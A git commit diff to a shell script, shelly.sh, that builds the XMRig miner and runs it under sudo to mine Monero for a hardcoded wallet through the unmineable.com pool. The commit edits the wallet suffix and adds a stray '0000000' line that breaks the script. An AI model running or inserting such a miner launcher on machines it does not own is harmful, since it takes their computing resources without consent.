c85683ff810dd224723d2e288df47e7f62bd10b9
shubham112113 <72217494+shubham112113@users.noreply.github.com>
2021-10-07 13:27:32 +0530

    Update shelly.sh

--- shelly.sh
+++ shelly.sh
@@ -4,4 +4,5 @@
   sudo ./build_deps.sh && cd ../build
   cmake .. -DXMRIG_DEPS=scripts/deps
   make -j$(nproc)
-  sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:49YfuC6hgSq8LddFuJcduThkMZBzraTiuLCPib7RJHZBjDeG7znTvDwH6SVNzRVpZ1JdDdK9eFz2k1aBycyDRNBdBCxaMAY+5000
+  sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:49YfuC6hgSq8LddFuJcduThkMZBzraTiuLCPib7RJHZBjDeG7znTvDwH6SVNzRVpZ1JdDdK9eFz2k1aBycyDRNBdBCxaMAY+3000
+  0000000
